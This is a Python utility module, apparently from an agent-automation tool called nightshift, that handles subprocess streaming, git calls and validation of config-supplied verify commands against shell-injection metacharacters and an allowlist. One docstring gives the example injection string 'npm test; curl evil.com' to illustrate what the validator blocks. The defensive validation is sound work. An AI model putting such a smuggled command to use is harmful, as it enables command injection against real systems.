"""Subprocess execution: streaming runner, git helper, shell utilities."""

from __future__ import annotations

import re
import shlex
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import IO

from nightshift.core.constants import VERIFY_COMMAND_ALLOWLIST_PREFIXES
from nightshift.core.errors import NightshiftError

# Shell metacharacters that enable command injection when a command string is
# passed verbatim to "bash -lc".  Any verify_command from an external config
# file that contains these characters AND does not start with an allowlisted
# prefix is rejected.
# Includes newlines (\n, \r) which bash treats as command separators, and
# redirections (>, <) which can read/write arbitrary files.
_SHELL_METACHAR_RE: re.Pattern[str] = re.compile(r"[;&|`$\n\r><]")


def _reader_thread(
    stdout: IO[str],
    lines: list[str],
    log_handle: IO[str] | None,
) -> None:
    """Read lines from subprocess stdout until EOF.  Runs in a daemon thread."""
    try:
        for line in iter(stdout.readline, ""):
            if not line:
                break
            sys.stdout.write(line)
            lines.append(line)
            if log_handle is not None:
                log_handle.write(line)
                log_handle.flush()
    except (OSError, ValueError):
        pass


def run_command(
    cmd: list[str],
    *,
    cwd: Path,
    log_path: Path | None = None,
    env: dict[str, str] | None = None,
    timeout_seconds: int | None = None,
) -> tuple[int, str]:
    process = subprocess.Popen(
        cmd,
        cwd=str(cwd),
        env=env,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )
    lines: list[str] = []
    log_handle: IO[str] | None = None
    try:
        if log_path is not None:
            log_path.parent.mkdir(parents=True, exist_ok=True)
            log_handle = log_path.open("a", encoding="utf-8")
        if process.stdout is None:
            raise NightshiftError("subprocess stdout is unexpectedly None")

        reader = threading.Thread(
            target=_reader_thread,
            args=(process.stdout, lines, log_handle),
            daemon=True,
        )
        reader.start()

        # Main thread enforces the timeout - reader thread cannot block us.
        deadline = time.monotonic() + timeout_seconds if timeout_seconds else None
        timed_out = False
        while reader.is_alive():
            remaining = None
            if deadline is not None:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    timed_out = True
                    break
            reader.join(timeout=min(remaining, 1.0) if remaining is not None else 1.0)

        if timed_out:
            timeout_message = (
                f"\n[nightshift] Agent cycle hit timeout after {timeout_seconds} seconds. "
                "Terminating the agent process.\n"
            )
            sys.stdout.write(timeout_message)
            lines.append(timeout_message)
            if log_handle is not None:
                log_handle.write(timeout_message)
                log_handle.flush()
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()
        else:
            process.wait()
    finally:
        if log_handle is not None:
            log_handle.close()
    return process.returncode, "".join(lines)


def run_capture(cmd: list[str], *, cwd: Path, check: bool = True, timeout: int = 60) -> str:
    result = subprocess.run(
        cmd,
        cwd=str(cwd),
        text=True,
        capture_output=True,
        check=False,
        timeout=timeout,
    )
    if check and result.returncode != 0:
        raise NightshiftError(
            f"Command failed ({result.returncode}): {' '.join(shlex.quote(part) for part in cmd)}\n"
            f"{result.stderr.strip()}"
        )
    return result.stdout.strip()


def git(cwd: Path, *args: str, check: bool = True) -> str:
    return run_capture(["git", *args], cwd=cwd, check=check)


def command_exists(name: str) -> bool:
    return (
        subprocess.run(
            ["bash", "-lc", f"command -v {shlex.quote(name)} >/dev/null"],
            check=False,
            capture_output=True,
            text=True,
            timeout=15,
        ).returncode
        == 0
    )


def validate_verify_command(command: str) -> None:
    """Validate a verify_command value sourced from an external config file.

    Raises NightshiftError if the command:
    - Is empty or whitespace-only
    - Contains shell metacharacters (;, |, backticks, $) that enable injection
    - Does not start with a known-safe binary prefix

    Shell metacharacters are always rejected, even for allowlisted prefixes,
    because a command like "npm test; curl evil.com" is still an injection
    attack.  The allowlist enforces that only recognized build-tool binaries
    are used as the entry point.

    Inferred commands (produced by nightshift itself, not from user config)
    should also be validated here as a belt-and-suspenders check.
    """
    stripped = command.strip()
    if not stripped:
        raise NightshiftError("verify_command must not be empty")

    # Always reject shell metacharacters -- no exceptions.
    # Blocked: ; & | backtick $ (command substitution/chaining),
    # \n \r (bash treats as command separators), > < (redirections).
    if _SHELL_METACHAR_RE.search(stripped):
        raise NightshiftError(
            f"verify_command rejected: contains shell metacharacters "
            f"(semicolons, pipes, redirections, newlines, or substitutions) "
            f"that could enable injection. Command: {stripped!r}. "
            f"Safe prefixes: npm, pnpm, yarn, bun, python3, cargo, go, make, "
            f"bash nightshift/scripts/, sh nightshift/scripts/"
        )

    # Exact match for bare "make" (no arguments).
    # Must be checked before the prefix loop to avoid matching "maker", etc.
    if stripped == "make":
        return

    # Require the command to start with a known-safe binary prefix.
    for prefix in VERIFY_COMMAND_ALLOWLIST_PREFIXES:
        if stripped.startswith(prefix):
            return

    raise NightshiftError(
        f"verify_command rejected: does not start with a known-safe prefix. "
        f"Command: {stripped!r}. "
        f"Safe prefixes: npm, pnpm, yarn, bun, python3, cargo, go, make, "
        f"bash nightshift/scripts/, sh nightshift/scripts/"
    )


def run_shell_string(command: str, *, cwd: Path, runner_log: Path) -> tuple[int, str]:
    return run_command(["bash", "-lc", command], cwd=cwd, log_path=runner_log)


def run_test_command(command: str, *, cwd: Path, timeout: int = 300) -> tuple[int, str]:
    """Run a shell command and return (exit_code, combined_output).

    Unlike run_capture (which only returns stdout), this returns the exit
    code alongside combined stdout+stderr.  Designed for test suite execution
    where the caller needs to inspect both the result and the output.
    """
    try:
        result = subprocess.run(
            ["bash", "-lc", command],
            cwd=str(cwd),
            text=True,
            capture_output=True,
            check=False,
            timeout=timeout,
        )
        return result.returncode, result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return 1, f"Command timed out after {timeout} seconds"
